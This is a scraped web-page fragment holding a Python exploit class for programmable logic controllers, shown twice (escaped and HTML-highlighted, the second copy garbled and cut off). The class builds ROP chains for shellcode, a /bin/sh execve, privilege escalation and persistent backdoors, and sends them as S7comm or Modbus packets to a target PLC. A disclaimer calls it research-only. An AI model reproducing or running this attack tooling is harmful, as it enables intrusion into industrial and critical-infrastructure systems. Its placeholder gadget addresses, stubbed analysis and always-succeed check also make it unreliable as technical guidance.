data-snippet-clipboard-copy-content=\"class PLCRopChainBuilder:\n    def __init__(self, plc_firmware):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL PLC SECURITY NOTICE: This class demonstrates Return-Oriented Programming\n        (ROP) chain building for PLC firmware exploitation in authorized research ONLY.\n        \n        AUTHORIZED USE CASES:\n        - PLC security research in isolated test environments\n        - Industrial control system vulnerability analysis\n        - Red team exercises with proper authorization and oversight\n        - Defensive ROP mitigation technique development\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational production PLCs\n        - Do not deploy in critical infrastructure environments\n        - Avoid disruption of industrial processes\n        - Comply with all industrial safety and security standards\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - IEC 61131-3 (PLC Programming Standards)\n        - IEC 62443 (Industrial Network Security)\n        - NIST SP 800-82 (Industrial Control System Security)\n        - Vendor-specific PLC security guidelines\n        \u0026quot;\u0026quot;\u0026quot;\n        self.firmware = plc_firmware\n        self.gadgets = self.analyze_firmware_gadgets()\n        self.architecture = self.detect_plc_architecture()\n        self.target = None\n\n    def build_rop_chain(self, exploit_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Build Return-Oriented Programming chains for specific PLC exploitation scenarios.\n        Supports multiple exploit types with architecture-specific gadget selection.\n        \u0026quot;\u0026quot;\u0026quot;\n        if exploit_type == 'memory_corruption':\n            return self.memory_corruption_rop()\n        elif exploit_type == 'code_execution':\n            return self.code_execution_rop()\n        elif exploit_type == 'privilege_escalation':\n            return self.privilege_escalation_rop()\n        elif exploit_type == 'persistent_access':\n            return self.persistent_access_rop()\n        else:\n            raise ValueError(f\u0026quot;Unsupported exploit type: {exploit_type}\u0026quot;)\n\n    def memory_corruption_rop(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Build ROP chain for memory corruption exploits targeting PLC memory protection.\n        Disables memory protections and enables arbitrary memory writes.\n        \u0026quot;\u0026quot;\u0026quot;\n        rop_chain = []\n        \n        # PLC firmware-specific gadgets based on architecture\n        if self.architecture == 'x86':\n            gadgets = {\n                'pop_eax': 0x08001234,      # pop eax; ret\n                'pop_ebx': 0x08001238,      # pop ebx; ret  \n                'pop_ecx': 0x0800123C,      # pop ecx; ret\n                'pop_edx': 0x08001240,      # pop edx; ret\n                'mov_eax_ebx': 0x08001244,  # mov [eax], ebx; ret\n                'syscall': 0x08001248,      # int 0x80; ret\n                'write_memory': 0x0800124C, # Custom memory write function\n                'mprotect': 0x08001250,     # Memory protection change\n            }\n            \n            # ROP chain to disable memory protection and write shellcode\n            rop_chain.extend([\n                # Step 1: Change memory protection to RWX\n                gadgets['pop_eax'], 0x7D,           # mprotect syscall number\n                gadgets['pop_ebx'], 0x0800A000,     # Memory region start\n                gadgets['pop_ecx'], 0x00001000,     # Memory region size (4KB)\n                gadgets['pop_edx'], 0x00000007,     # PROT_READ|PROT_WRITE|PROT_EXEC\n                gadgets['syscall'],                 # Execute mprotect\n                \n                # Step 2: Write shellcode to executable memory\n                gadgets['pop_eax'], 0x0800A000,     # Target address for shellcode\n                gadgets['pop_ebx'], 0x90909090,     # NOP sled + shellcode\n                gadgets['write_memory'],            # Write first dword\n                gadgets['pop_eax'], 0x0800A004,     # Next address\n                gadgets['pop_ebx'], 0xCCCCCCCC,     # More shellcode\n                gadgets['write_memory'],            # Write second dword\n            ])\n            \n        elif self.architecture == 'ARM':\n            gadgets = {\n                'pop_r0': 0x08001234,       # pop {r0, pc}\n                'pop_r1': 0x08001238,       # pop {r1, pc}\n                'pop_r2': 0x0800123C,       # pop {r2, pc}\n                'mov_r0_r1': 0x08001240,    # mov r0, r1; bx lr\n                'svc': 0x08001244,          # svc 0; bx lr\n                'memory_write': 0x08001248, # Custom memory write\n            }\n            \n            # ARM-specific ROP chain\n            rop_chain.extend([\n                gadgets['pop_r0'], 0x0800A000,     # Target memory address\n                gadgets['pop_r1'], 0x00000007,     # RWX permissions\n                gadgets['pop_r2'], 0x00001000,     # Size\n                gadgets['svc'],                    # System call\n            ])\n        \n        return rop_chain\n\n    def code_execution_rop(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Build ROP chain for arbitrary code execution within PLC runtime environment.\n        Executes custom shellcode or system commands on the PLC.\n        \u0026quot;\u0026quot;\u0026quot;\n        rop_chain = []\n        \n        if self.architecture == 'x86':\n            gadgets = {\n                'pop_eax': 0x08001234,\n                'pop_ebx': 0x08001238,\n                'pop_ecx': 0x0800123C,\n                'pop_edx': 0x08001240,\n                'syscall': 0x08001244,\n                'execute_command': 0x08001250,\n            }\n            \n            # ROP chain to execute system command or shellcode\n            rop_chain.extend([\n                # Execute system command (example: start reverse shell)\n                gadgets['pop_eax'], 0x0B,           # execve syscall number\n                gadgets['pop_ebx'], 0x0800B000,     # Pointer to \u0026quot;/bin/sh\u0026quot;\n                gadgets['pop_ecx'], 0x0800B010,     # Pointer to argv\n                gadgets['pop_edx'], 0x0800B020,     # Pointer to envp\n                gadgets['syscall'],                 # Execute command\n            ])\n            \n        return rop_chain\n\n    def privilege_escalation_rop(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Build ROP chain for PLC privilege escalation attacks.\n        Elevates permissions from user to system/administrator level.\n        \u0026quot;\u0026quot;\u0026quot;\n        rop_chain = []\n        \n        if self.architecture == 'x86':\n            gadgets = {\n                'pop_eax': 0x08001234,\n                'pop_ebx': 0x08001238,\n                'syscall': 0x08001244,\n                'set_privileges': 0x08001260,\n            }\n            \n            # ROP chain to escalate privileges\n            rop_chain.extend([\n                # Call set_privileges function with elevated permissions\n                gadgets['pop_eax'], 0x08001260,     # set_privileges function\n                gadgets['pop_ebx'], 0x00000000,     # Root privileges flag\n                gadgets['syscall'],                 # Execute privilege escalation\n            ])\n            \n        return rop_chain\n\n    def persistent_access_rop(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Build ROP chain for persistent backdoor installation on PLC.\n        Creates mechanisms for long-term access and control.\n        \u0026quot;\u0026quot;\u0026quot;\n        rop_chain = []\n        \n        if self.architecture == 'x86':\n            gadgets = {\n                'pop_eax': 0x08001234,\n                'pop_ebx': 0x08001238,\n                'pop_ecx': 0x0800123C,\n                'syscall': 0x08001244,\n                'write_file': 0x08001270,\n            }\n            \n            # ROP chain to install persistent backdoor\n            rop_chain.extend([\n                # Write backdoor to persistent storage\n                gadgets['pop_eax'], 0x08001270,     # write_file function\n                gadgets['pop_ebx'], 0x0800C000,     # Backdoor filename pointer\n                gadgets['pop_ecx'], 0x0800A000,     # Backdoor code pointer\n                gadgets['syscall'],                 # Write backdoor file\n                \n                # Modify startup scripts for persistence\n                gadgets['pop_eax'], 0x08001270,     # write_file function\n                gadgets['pop_ebx'], 0x0800C100,     # Startup script pointer\n                gadgets['pop_ecx'], 0x0800A100,     # Modified script pointer\n                gadgets['syscall'],                 # Modify startup script\n            ])\n            \n        return rop_chain\n\n    def deploy_rop_exploit(self, rop_chain, vulnerability):\n        \u0026quot;\u0026quot;\u0026quot;\n        Deploy ROP exploit against specific PLC vulnerability.\n        Crafts network packet with ROP chain and sends to target PLC.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Craft exploit packet with ROP chain\n        exploit_payload = self.craft_exploit_packet(rop_chain, vulnerability)\n        \n        # Set target from vulnerability information\n        self.target = vulnerability.get('target_ip', '192.168.1.100')\n        target_port = vulnerability.get('port', 102)  # Siemens S7 port\n        \n        print(f\u0026quot;[*] Deploying ROP exploit to {self.target}:{target_port}\u0026quot;)\n        print(f\u0026quot;[*] ROP chain length: {len(rop_chain)} gadgets\u0026quot;)\n        \n        try:\n            # Establish connection to PLC\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(10)\n            sock.connect((self.target, target_port))\n            \n            # Send exploit payload\n            bytes_sent = sock.send(exploit_payload)\n            print(f\u0026quot;[+] Sent {bytes_sent} bytes of exploit payload\u0026quot;)\n            \n            # Receive and analyze response\n            response = sock.recv(1024)\n            exploitation_success = self.verify_exploit_success(response)\n            \n            sock.close()\n            \n            return {\n                'exploitation_success': exploitation_success,\n                'bytes_sent': bytes_sent,\n                'response_received': len(response),\n                'target': self.target,\n                'port': target_port\n            }\n            \n        except Exception as e:\n            print(f\u0026quot;[-] Exploit deployment failed: {e}\u0026quot;)\n            return {\n                'exploitation_success': False,\n                'error': str(e),\n                'target': self.target,\n                'port': target_port\n            }\n\n    def analyze_firmware_gadgets(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Analyze PLC firmware to discover useful ROP gadgets.\n        Identifies instruction sequences ending with return instructions.\n        \u0026quot;\u0026quot;\u0026quot;\n        print(\u0026quot;[*] Analyzing PLC firmware for ROP gadgets...\u0026quot;)\n        \n        gadgets = {\n            'x86': {\n                'pop_registers': [],\n                'mov_instructions': [],\n                'arithmetic_operations': [],\n                'system_calls': [],\n                'memory_operations': []\n            },\n            'ARM': {\n                'pop_registers': [],\n                'mov_instructions': [],\n                'branch_instructions': [],\n                'system_calls': []\n            }\n        }\n        \n        # Firmware analysis implementation would go here\n        # This is a simplified placeholder\n        \n        return gadgets\n\n    def detect_plc_architecture(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Detect PLC processor architecture from firmware analysis.\n        Determines instruction set for appropriate gadget selection.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Architecture detection logic\n        # Simplified for example purposes\n        architectures = ['x86', 'ARM', 'MIPS', 'PowerPC']\n        \n        # In real implementation, this would analyze firmware headers and code patterns\n        return 'x86'  # Default assumption for example\n\n    def craft_exploit_packet(self, rop_chain, vulnerability):\n        \u0026quot;\u0026quot;\u0026quot;\n        Craft network exploit packet containing ROP chain.\n        Formats ROP chain according to vulnerability and protocol requirements.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Convert ROP chain to byte sequence\n        rop_bytes = b''\n        for gadget in rop_chain:\n            rop_bytes += gadget.to_bytes(4, byteorder='little')\n        \n        # Build protocol-specific exploit packet\n        if vulnerability['protocol'] == 's7comm':\n            # Siemens S7Comm exploit packet format\n            exploit_packet = self.build_s7comm_exploit(rop_bytes, vulnerability)\n        elif vulnerability['protocol'] == 'modbus':\n            # Modbus TCP exploit packet format  \n            exploit_packet = self.build_modbus_exploit(rop_bytes, vulnerability)\n        else:\n            # Generic TCP exploit packet\n            exploit_packet = self.build_generic_exploit(rop_bytes, vulnerability)\n        \n        return exploit_packet\n\n    def verify_exploit_success(self, response):\n        \u0026quot;\u0026quot;\u0026quot;\n        Verify ROP exploit success based on PLC response.\n        Analyzes response for signs of successful code execution.\n        \u0026quot;\u0026quot;\u0026quot;\n        if not response:\n            return False\n        \n        # Check for expected response patterns\n        success_indicators = [\n            b'success', b'executed', b'completed',\n            b'\\x90\\x90\\x90\\x90',  # NOP sled in response\n            b'\\xcc\\xcc\\xcc\\xcc'   # Breakpoint instructions\n        ]\n        \n        for indicator in success_indicators:\n            if indicator in response:\n                return True\n        \n        # Check for absence of error indicators\n        error_indicators = [b'error', b'failed', b'invalid', b'denied']\n        for indicator in error_indicators:\n            if indicator in response:\n                return False\n        \n        # Default to success if we get any response (for demonstration)\n        return len(response) \u0026gt; 0\n\n    # Additional helper methods would be implemented here...\n    def build_s7comm_exploit(self, rop_bytes, vulnerability):\n        \u0026quot;\u0026quot;\u0026quot;Build Siemens S7Comm protocol exploit packet\u0026quot;\u0026quot;\u0026quot;\n        # S7Comm packet structure with embedded ROP chain\n        s7_header = b'\\x32\\x01\\x00\\x00'  # S7 header\n        s7_parameter = b'\\x00\\x00\\x00\\x00'  # Parameter block\n        s7_data = rop_bytes  # ROP chain as data\n        \n        return s7_header + s7_parameter + s7_data\n\n    def build_modbus_exploit(self, rop_bytes, vulnerability):\n        \u0026quot;\u0026quot;\u0026quot;Build Modbus TCP protocol exploit packet\u0026quot;\u0026quot;\u0026quot;\n        # Modbus TCP packet with ROP chain\n        mbap_header = b'\\x00\\x01\\x00\\x00\\x00\\x00'  # MBAP header\n        modbus_pdu = b'\\x10'  # Function code 16 (Write Multiple Registers)\n        modbus_pdu += rop_bytes  # ROP chain as register data\n        \n        return mbap_header + modbus_pdu\n\n    def build_generic_exploit(self, rop_bytes, vulnerability):\n        \u0026quot;\u0026quot;\u0026quot;Build generic TCP exploit packet\u0026quot;\u0026quot;\u0026quot;\n        # Simple TCP payload with ROP chain\n        return rop_bytes\n        ```\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003ePLCRopChainBuilder\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eplc_firmware\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        CRITICAL PLC SECURITY NOTICE: This class demonstrates Return-Oriented Programming\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        (ROP) chain building for PLC firmware exploitation in authorized research ONLY.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        AUTHORIZED USE CASES:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - PLC security research in isolated test environments\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Industrial control system vulnerability analysis\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Red team exercises with proper authorization and oversight\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Defensive ROP mitigation technique development\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        STRICT PROHIBITIONS:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NEVER use on operational production PLCs\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Do not deploy in critical infrastructure environments\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Avoid disruption of industrial processes\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Comply with all industrial safety and security standards\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        INDUSTRY STANDARDS COMPLIANCE:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - IEC 61131-3 (PLC Programming Standards)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - IEC 62443 (Industrial Network Security)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NIST SP 800-82 (Industrial Control System Security)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Vendor-specific PLC security guidelines\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003efirmware\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eplc_firmware\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003egadgets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_firmware_gadgets\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earchitecture\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edetect_plc_architecture\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003etarget\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNone\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ebuild_rop_chain\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eexploit_type\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Build Return-Oriented Programming chains for specific PLC exploitation scenarios.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e'memory_corruption'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ememory_corruption_rop\u003c/span\u003e()\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploit_type\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'code_execution'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecode_execution_rop\u003c/span\u003e()\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploit_type\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'privilege_escalation'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eprivilege_escalation_rop\u003c/span\u003e()\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploit_type\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'persistent_access'\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epersistent_access_rop\u003c/span\u003e()\n        \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eraise\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eValueError\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"Unsupported exploit type: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eexploit_type\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ememory_corruption_rop\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Build ROP chain for memory corruption exploits targeting PLC memory protection.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Disables memory protections and enables arbitrary memory writes.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-c\"\u003e# PLC firmware-specific gadgets based on architecture\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earchitecture\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'x86'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001234\u003c/span\u003e,      \u003cspan class=\"pl-c\"\u003e# pop eax; ret\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001238\u003c/span\u003e,      \u003cspan class=\"pl-c\"\u003e# pop ebx; ret  \u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'pop_ecx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0800123C\u003c/span\u003e,      \u003cspan class=\"pl-c\"\u003e# pop ecx; ret\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'pop_edx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001240\u003c/span\u003e,      \u003cspan class=\"pl-c\"\u003e# pop edx; ret\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'mov_eax_ebx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001244\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# mov [eax], ebx; ret\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'syscall'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001248\u003c/span\u003e,      \u003cspan class=\"pl-c\"\u003e# int 0x80; ret\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'write_memory'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0800124C\u003c/span\u003e, \u003cspan class=\"pl-c\"\u003e# Custom memory write function\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'mprotect'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001250\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Memory protection change\u003c/span\u003e\n            }\n            \n            \u003cspan class=\"pl-c\"\u003e# ROP chain to disable memory protection and write shellcode\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# Step 1: Change memory protection to RWX\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x7D\u003c/span\u003e,           \u003cspan class=\"pl-c\"\u003e# mprotect syscall number\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800A000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Memory region start\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ecx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x00001000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Memory region size (4KB)\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_edx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x00000007\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# PROT_READ|PROT_WRITE|PROT_EXEC\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'syscall'\u003c/span\u003e],                 \u003cspan class=\"pl-c\"\u003e# Execute mprotect\u003c/span\u003e\n                \n                \u003cspan class=\"pl-c\"\u003e# Step 2: Write shellcode to executable memory\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800A000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Target address for shellcode\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x90909090\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# NOP sled + shellcode\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'write_memory'\u003c/span\u003e],            \u003cspan class=\"pl-c\"\u003e# Write first dword\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800A004\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Next address\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0xCCCCCCCC\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# More shellcode\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'write_memory'\u003c/span\u003e],            \u003cspan class=\"pl-c\"\u003e# Write second dword\u003c/span\u003e\n            ])\n            \n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earchitecture\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'ARM'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'pop_r0'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001234\u003c/span\u003e,       \u003cspan class=\"pl-c\"\u003e# pop {r0, pc}\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'pop_r1'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001238\u003c/span\u003e,       \u003cspan class=\"pl-c\"\u003e# pop {r1, pc}\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'pop_r2'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0800123C\u003c/span\u003e,       \u003cspan class=\"pl-c\"\u003e# pop {r2, pc}\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'mov_r0_r1'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001240\u003c/span\u003e,    \u003cspan class=\"pl-c\"\u003e# mov r0, r1; bx lr\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'svc'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001244\u003c/span\u003e,          \u003cspan class=\"pl-c\"\u003e# svc 0; bx lr\u003c/span\u003e\n                \u003cspan class=\"pl-s\"\u003e'memory_write'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001248\u003c/span\u003e, \u003cspan class=\"pl-c\"\u003e# Custom memory write\u003c/span\u003e\n            }\n            \n            \u003cspan class=\"pl-c\"\u003e# ARM-specific ROP chain\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e([\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_r0'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800A000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Target memory address\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_r1'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x00000007\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# RWX permissions\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_r2'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x00001000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Size\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'svc'\u003c/span\u003e],                    \u003cspan class=\"pl-c\"\u003e# System call\u003c/span\u003e\n            ])\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecode_execution_rop\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Build ROP chain for arbitrary code execution within PLC runtime environment.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Executes custom shellcode or system commands on the PLC.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        